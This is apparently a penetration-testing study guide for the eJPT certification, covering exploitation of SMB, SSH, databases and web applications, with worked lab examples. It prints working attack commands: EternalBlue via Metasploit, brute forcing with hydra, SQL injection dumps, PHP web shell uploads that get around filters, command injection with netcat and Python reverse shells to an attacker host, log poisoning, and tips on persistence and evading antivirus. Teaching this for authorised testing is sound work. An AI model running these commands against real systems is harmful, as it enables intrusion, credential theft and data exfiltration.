# üí• Exploitation Basics - Vulnerability Exploitation Framework

**Master fundamental exploitation techniques for successful penetration testing and eJPT certification**
**Location:** `01-theory-foundations/pentesting-methodology/exploitation-basics.md`

## üéØ What is Exploitation?

Exploitation is the process of taking advantage of identified vulnerabilities to gain unauthorized access, execute code, or compromise system security. It represents the core practical skill in penetration testing, transitioning from theoretical vulnerability knowledge to actual system compromise. For eJPT candidates, exploitation skills are critical as they constitute approximately 46% of the exam content, split between "Host & Network Penetration Testing" (23%) and "Web Application Penetration Testing" (23%).

Successful exploitation requires understanding vulnerability mechanics, payload selection, tool usage, and post-exploitation activities to demonstrate real-world impact.

## üì¶ Exploitation Categories and Approaches

### Network Service Exploitation:
```bash
# Target: Network services and protocols
# Common vectors: Buffer overflows, protocol flaws, misconfigurations
# Tools: Metasploit, custom exploits, service-specific tools
# Examples: SMB exploits, SSH attacks, database compromise

# Key characteristics:
- Direct service targeting
- Often requires specific payloads
- Can lead to immediate system access
- May bypass application-layer controls
```

### Web Application Exploitation:
```bash
# Target: Web applications and web services
# Common vectors: Injection flaws, authentication bypass, file upload
# Tools: SQLMap, Burp Suite, manual techniques
# Examples: SQL injection, file upload, XSS, command injection

# Key characteristics:
- Application logic exploitation
- Often multi-step processes
- Requires web-specific knowledge
- Can lead to data access or RCE
```

### Client-Side Exploitation:
```bash
# Target: Client applications and user interactions
# Common vectors: Browser exploits, social engineering, malicious files
# Tools: Social engineering toolkit, browser exploits
# Examples: Phishing, malicious documents, drive-by downloads

# Key characteristics:
- User interaction required
- Often part of larger campaigns
- Bypasses perimeter defenses
- Targets human element
```

## üîß Network Service Exploitation Fundamentals

### SMB/NetBIOS Exploitation:
```bash
# EternalBlue (MS17-010) - Critical SMB vulnerability
# Metasploit exploitation
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit

# Manual SMB enumeration and exploitation
smbclient -L //target_ip
smbclient //target_ip/share$ -U guest
enum4linux target_ip

# SMB null session testing
rpcclient -U "" target_ip
smbclient //target_ip/IPC$ -U ""

# Expected results:
# Successful exploitation: Meterpreter session established
# Manual enumeration: Share access, user enumeration
```

### SSH Service Exploitation:
```bash
# SSH brute force attacks
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target_ip
hydra -L users.txt -P passwords.txt ssh://target_ip

# SSH key-based attacks
ssh-keygen -t rsa -b 2048 -f id_rsa
ssh-copy-id user@target_ip
ssh -i id_rsa user@target_ip

# SSH tunneling for pivoting
ssh -L local_port:target_host:target_port user@pivot_host
ssh -D 8080 user@target_ip  # SOCKS proxy

# SSH version-specific exploits
searchsploit openssh
msfconsole
search ssh
use exploit/linux/ssh/ssh_login
```

### Database Service Exploitation:
```bash
# MySQL exploitation
mysql -h target_ip -u root -p
mysql -h target_ip -u root  # No password

# MySQL privilege escalation
mysql> select user();
mysql> show grants;
mysql> select * from mysql.user;

# MSSQL exploitation
mssqlclient.py username:password@target_ip
# or
sqsh -S target_ip -U username -P password

# MSSQL command execution
xp_cmdshell 'whoami'
sp_configure 'show advanced options', 1
sp_configure 'xp_cmdshell', 1

# PostgreSQL exploitation
psql -h target_ip -U username -d database
# PostgreSQL code execution
COPY (SELECT '') TO PROGRAM 'id';
```

### FTP Service Exploitation:
```bash
# Anonymous FTP access
ftp target_ip
# Username: anonymous
# Password: (blank or email)

# FTP bounce attacks
nmap -b ftp_relay_host target_ip

# FTP brute force
hydra -l anonymous -P passwords.txt ftp://target_ip
hydra -L users.txt -P passwords.txt ftp://target_ip

# FTP directory traversal
ftp> cd ../../../etc
ftp> get passwd
```

## ‚öôÔ∏è Web Application Exploitation Fundamentals

### SQL Injection Exploitation:
```bash
# Manual SQL injection testing
curl "http://target_ip/page.php?id=1'"
curl "http://target_ip/page.php?id=1 AND 1=1"
curl "http://target_ip/page.php?id=1 AND 1=2"

# Union-based SQL injection
curl "http://target_ip/page.php?id=1 UNION SELECT 1,2,3,4"
curl "http://target_ip/page.php?id=1 UNION SELECT null,username,password,null FROM users"

# Automated SQL injection with SQLMap
sqlmap -u "http://target_ip/page.php?id=1"
sqlmap -u "http://target_ip/page.php?id=1" --dbs
sqlmap -u "http://target_ip/page.php?id=1" -D database --tables
sqlmap -u "http://target_ip/page.php?id=1" -D database -T users --dump

# Time-based blind SQL injection
curl "http://target_ip/page.php?id=1 AND SLEEP(5)"
sqlmap -u "http://target_ip/page.php?id=1" --technique=T
```

### File Upload Exploitation:
```bash
# PHP web shell upload
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -X POST -F "file=@shell.php" http://target_ip/upload.php

# Bypass file extension filters
mv shell.php shell.php.jpg
mv shell.php shell.phtml
mv shell.php shell.php5

# Double extension bypass
mv shell.php shell.jpg.php

# Content-type bypass
curl -X POST -F "file=@shell.php;type=image/jpeg" http://target_ip/upload.php

# Access uploaded shell
curl "http://target_ip/uploads/shell.php?cmd=whoami"
curl "http://target_ip/uploads/shell.php?cmd=id"
```

### Command Injection Exploitation:
```bash
# OS command injection testing
curl "http://target_ip/ping.php?host=127.0.0.1;id"
curl "http://target_ip/ping.php?host=127.0.0.1|whoami"
curl "http://target_ip/ping.php?host=127.0.0.1&&ls"

# Command injection with URL encoding
curl "http://target_ip/ping.php?host=127.0.0.1%3Bid"
curl "http://target_ip/ping.php?host=127.0.0.1%26%26whoami"

# Reverse shell via command injection
curl "http://target_ip/ping.php?host=127.0.0.1;nc+-e+/bin/bash+attacker_ip+4444"
curl "http://target_ip/ping.php?host=127.0.0.1;python+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker_ip\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"])'"
```

### Directory Traversal Exploitation:
```bash
# Local file inclusion (LFI)
curl "http://target_ip/page.php?file=../../../etc/passwd"
curl "http://target_ip/page.php?file=....//....//....//etc/passwd"
curl "http://target_ip/page.php?file=/etc/passwd%00"

# Windows LFI
curl "http://target_ip/page.php?file=../../../windows/system32/drivers/etc/hosts"
curl "http://target_ip/page.php?file=C:\windows\system32\drivers\etc\hosts"

# Log poisoning for RCE
curl "http://target_ip/page.php?file=../../../var/log/apache2/access.log"
# First, poison the log
curl -A "<?php system(\$_GET['cmd']); ?>" http://target_ip/
# Then execute commands
curl "http://target_ip/page.php?file=../../../var/log/apache2/access.log&cmd=whoami"
```

## üß™ Real Lab Examples

### Example 1: SMB EternalBlue Exploitation
```bash
# Step 1: Vulnerability identification
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.100
# Output:
# | smb-vuln-ms17-010:
# |   VULNERABLE:
# |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
# |     State: VULNERABLE

# Step 2: Metasploit exploitation
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit

# Expected output:
# [*] Started reverse TCP handler on 192.168.1.50:4444
# [*] 192.168.1.100:445 - Connecting to target for exploitation.
# [+] 192.168.1.100:445 - Connection established for exploitation.
# [*] Sending stage (200262 bytes) to 192.168.1.100
# [*] Meterpreter session 1 opened

# Step 3: Post-exploitation
meterpreter > getuid
# Output: Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
meterpreter > hashdump
```

### Example 2: Web Application SQL Injection
```bash
# Step 1: Manual identification
curl "http://192.168.1.100/login.php?id=1'"
# Output: MySQL error: You have an error in your SQL syntax

# Step 2: Union-based exploitation
curl "http://192.168.1.100/login.php?id=1 UNION SELECT 1,2,3,4"
# Output: Shows columns 2,3 are reflected

curl "http://192.168.1.100/login.php?id=1 UNION SELECT 1,database(),user(),version()"
# Output: Database: webapp, User: root@localhost, Version: 5.5.62

# Step 3: Data extraction
curl "http://192.168.1.100/login.php?id=1 UNION SELECT 1,username,password,4 FROM users"
# Output: admin:5d41402abc4b2a76b9719d911017c592 (hash)

# Step 4: Automated exploitation
sqlmap -u "http://192.168.1.100/login.php?id=1" --dump-all
# Output: Complete database dump with all tables and data
```

### Example 3: File Upload Web Shell
```bash
# Step 1: Identify upload functionality
gobuster dir -u http://192.168.1.100 -w wordlist.txt
# Output: /upload (Status: 200)

# Step 2: Create web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 3: Upload attempt
curl -X POST -F "file=@shell.php" http://192.168.1.100/upload.php
# Output: Error: Only image files allowed

# Step 4: Bypass filter
mv shell.php shell.php.jpg
curl -X POST -F "file=@shell.php.jpg" http://192.168.1.100/upload.php
# Output: File uploaded successfully to /uploads/shell.php.jpg

# Step 5: Execute commands
curl "http://192.168.1.100/uploads/shell.php.jpg?cmd=whoami"
# Output: www-data

curl "http://192.168.1.100/uploads/shell.php.jpg?cmd=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Example 4: Database Direct Access
```bash
# Step 1: MySQL enumeration
nmap --script mysql-info -p 3306 192.168.1.100
# Output: MySQL 5.5.62, no authentication required

# Step 2: Direct connection
mysql -h 192.168.1.100
# Output: Successfully connected to MySQL

# Step 3: Database enumeration
mysql> show databases;
# Output:
# +--------------------+
# | Database           |
# +--------------------+
# | information_schema |
# | mysql              |
# | webapp             |
# +--------------------+

mysql> use webapp;
mysql> show tables;
# Output:
# +------------------+
# | Tables_in_webapp |
# +------------------+
# | users            |
# | products         |
# | orders           |
# +------------------+

mysql> select * from users;
# Output: Complete user table with credentials
```

## üéØ eJPT Exam Focus

### Essential Skills for eJPT (46% of exam - Network + Web Application Penetration Testing):
- **Network service exploitation** using automated and manual techniques (25%)
- **Web application exploitation** including injection and file upload attacks (30%)
- **Database access and exploitation** through various vectors (20%)
- **Post-exploitation activities** and impact demonstration (25%)

### Critical Exploitation Tools for eJPT:
```bash
# Network exploitation
msfconsole                          # Primary exploitation framework
hydra                               # Brute force attacks
searchsploit                        # Exploit database search

# Web application exploitation
sqlmap                              # SQL injection automation
burp suite                          # Web application proxy
curl                                # Manual HTTP testing

# Database exploitation
mysql                               # MySQL client
mssqlclient.py                      # MSSQL client
psql                                # PostgreSQL client

# Post-exploitation
nc                                  # Netcat for shells
python                              # Scripting and reverse shells
```

### eJPT Exploitation Methodology:
```bash
# Phase 1: Exploit Selection (20% of time)
# Based on vulnerability assessment results
# Prioritize by impact and ease of exploitation
# Research exploit availability and requirements

# Phase 2: Exploitation Attempt (60% of time)
# Configure exploit parameters
# Execute exploitation
# Verify successful compromise
# Establish persistent access

# Phase 3: Impact Demonstration (20% of time)
# Document successful compromise
# Demonstrate data access
# Show privilege level achieved
# Capture evidence for reporting
```

### eJPT Exam Scenarios:
1. **Network Service Compromise:** Exploit network services for system access
   - Required skills: Service exploitation, payload selection, Metasploit usage
   - Expected tools: Metasploit, hydra, service-specific exploits
   - Success criteria: Remote shell access, privilege escalation

2. **Web Application Compromise:** Exploit web applications for data access
   - Required skills: SQL injection, file upload, command injection
   - Expected tools: SQLMap, Burp Suite, manual testing
   - Success criteria: Database access, file system access, code execution

3. **Database System Compromise:** Direct database exploitation
   - Required skills: Database enumeration, privilege escalation, data extraction
   - Expected tools: Database clients, custom queries, automated tools
   - Success criteria: Administrative access, sensitive data retrieval

### Exam Tips and Tricks:
- **Tip 1:** Always verify successful exploitation with multiple commands
- **Tip 2:** Document all successful exploits with screenshots and outputs
- **Tip 3:** Understand exploit requirements (authentication, network access, etc.)
- **Tip 4:** Practice both automated tools and manual techniques

### Common eJPT Questions:
- Demonstrate successful exploitation of identified vulnerabilities
- Show privilege escalation after initial compromise
- Extract sensitive data from compromised systems
- Explain exploitation techniques and their impact

## ‚ö†Ô∏è Common Issues & Troubleshooting

### Issue 1: Exploit Fails to Execute
**Problem:** Exploit attempts fail without successful compromise
**Cause:** Wrong target version, missing dependencies, network filtering
**Solution:**
```bash
# Verify target compatibility
searchsploit service_name version
msfconsole
search service_name
info exploit/path/to/exploit

# Check exploit requirements
show options
show advanced
set VERBOSE true

# Alternative exploitation methods
# Try different payloads
# Use manual exploitation techniques
# Verify network connectivity
```

### Issue 2: Payload Delivery Failure
**Problem:** Exploit succeeds but payload fails to execute
**Cause:** Antivirus detection, wrong architecture, firewall blocking
**Solution:**
```bash
# Try different payload types
set payload windows/meterpreter/reverse_tcp
set payload windows/shell/reverse_tcp
set payload cmd/unix/reverse

# Use encoded payloads
set encoder x86/shikata_ga_nai
set iterations 3

# Alternative delivery methods
# Use staged vs non-staged payloads
# Try different ports and protocols
```

### Issue 3: Web Exploitation Blocked
**Problem:** Web application attacks are filtered or blocked
**Cause:** WAF protection, input filtering, encoding issues
**Solution:**
```bash
# WAF bypass techniques
# Use different encoding
curl "http://target/page.php?id=1%27"     # URL encoding
curl "http://target/page.php?id=1\'"      # Backslash escaping

# Alternative injection points
# POST parameters instead of GET
# Headers (User-Agent, Referer)
# Cookie values

# Manual vs automated tools
# SQLMap may be detected, try manual injection
# Use Burp Suite for complex scenarios
```

### Issue 4: Access Level Insufficient
**Problem:** Successful exploitation but limited access achieved
**Cause:** Low-privilege user, restricted environment, limited permissions
**Solution:**
```bash
# Enumerate current privileges
whoami
id
sudo -l

# Look for privilege escalation vectors
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
crontab -l                                 # Scheduled tasks
cat /etc/passwd                           # User accounts

# Try different exploitation paths
# Target different services
# Look for credential reuse
# Check for misconfigurations
```

## üîó Integration with Post-Exploitation

### Exploitation ‚Üí Post-Exploitation Transition:
```bash
# Successful network exploitation
meterpreter > getuid
meterpreter > sysinfo
meterpreter > shell

# Upgrade to better shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Establish persistence
# Create backdoor accounts
# Schedule persistent access
# Install web shells
```

### Multi-Vector Exploitation:
```bash
# Combine different attack vectors
# 1. SQL injection for data access
sqlmap -u "target_url" --dump

# 2. File upload for code execution
# Upload web shell via SQL injection into writable directory
# Or use file upload vulnerability

# 3. Privilege escalation
# Use local exploits or misconfigurations
# Combine with lateral movement
```

### Evidence Collection During Exploitation:
```bash
# Document successful exploitation
script -a exploitation_log.txt
# Execute exploitation commands
# Exit to save log

# Screenshot successful compromises
# Save all tool outputs
# Document access levels achieved
# Capture sensitive data accessed
```

## üìù Documentation and Reporting

### Exploitation Documentation Requirements:
```markdown
## Exploitation Results

### Successful Exploitations Summary
- **Network Services:** 3 systems compromised
- **Web Applications:** 2 applications compromised  
- **Databases:** 1 database directly accessed
- **Privilege Level:** Administrator/root access achieved

### Detailed Exploitation Results

#### SMB Remote Code Execution (MS17-010)
- **Target:** 192.168.1.100:445
- **Vulnerability:** EternalBlue (CVE-2017-0143)
- **Exploit Used:** exploit/windows/smb/ms17_010_eternalblue
- **Payload:** windows/x64/meterpreter/reverse_tcp
- **Result:** SYSTEM-level access achieved

**Exploitation Steps:**
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
exploit
```

**Proof of Compromise:**
- Session established: meterpreter session 1
- User context: NT AUTHORITY\SYSTEM
- System information: Windows 7 SP1 x64
- Evidence: Screenshot of successful exploitation

#### SQL Injection Database Access
- **Target:** http://192.168.1.100/login.php
- **Vulnerability:** Union-based SQL injection
- **Tool Used:** SQLMap + manual techniques
- **Result:** Complete database access

**Exploitation Steps:**
```bash
sqlmap -u "http://192.168.1.100/login.php?id=1" --dump-all
```

**Data Accessed:**
- User credentials: 15 user accounts with hashed passwords
- Personal information: Names, emails, phone numbers
- Administrative data: System configuration, audit logs
- Evidence: Database dump files and screenshots

### Impact Assessment
- **Confidentiality:** High - Sensitive data accessed
- **Integrity:** Medium - Ability to modify system data
- **Availability:** Low - No denial of service achieved
- **Business Impact:** Critical - Customer data compromised
```

## üìö Exploitation Quick Reference

### Common Exploitation Frameworks:
```bash
# Metasploit Framework
msfconsole                          # Interactive console
msfvenom                            # Payload generator
searchsploit                        # Exploit database

# Manual exploitation tools
nc                                  # Netcat for shells
socat                              # Advanced networking tool
python/perl/bash                   # Scripting languages
```

### Payload Types and Usage:
| Payload Type | Use Case | Examples |
|--------------|----------|----------|
| **Reverse Shell** | NAT/Firewall bypass | `reverse_tcp`, `reverse_https` |
| **Bind Shell** | Direct connection | `bind_tcp`, `bind_pipe` |
| **Meterpreter** | Advanced post-exploitation | `meterpreter/reverse_tcp` |
| **Command Shell** | Simple command execution | `shell/reverse_tcp` |
| **Web Shells** | Web application compromise | PHP, ASP, JSP shells |

### Common Exploitation Ports:
```bash
# Listener ports (attacker)
4444                               # Default Metasploit
443                                # HTTPS (bypasses firewalls)
80                                 # HTTP (bypasses firewalls)
53                                 # DNS (bypasses firewalls)

# Service exploitation ports (target)
445                                # SMB (EternalBlue, PsExec)
22                                 # SSH (brute force, key attacks)
3389                               # RDP (brute force, BlueKeep)
80/443                             # Web applications
3306/1433/5432                     # Databases
```
